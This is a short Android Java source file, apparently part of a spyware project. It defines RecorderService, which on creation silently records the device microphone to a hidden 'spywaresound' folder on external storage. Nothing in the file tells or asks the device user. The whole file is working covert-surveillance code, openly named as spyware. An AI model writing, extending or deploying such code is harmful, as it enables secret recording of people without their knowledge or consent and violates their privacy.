package spywareservice;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;

import java.io.File;
import java.io.IOException;

public class RecorderService extends Service {
    private MediaRecorder mediaRecorder = null;
    public RecorderService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onCreate(){
        File path = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator +"spywaresound");
        if(!path.exists()){
            path.mkdirs();
        }
        File OutPutFile = new File(path + File.separator + String.valueOf(System.currentTimeMillis()) + ".aac");

        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setOutputFile(OutPutFile.toString());
        mediaRecorder.setMaxDuration(10000);
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
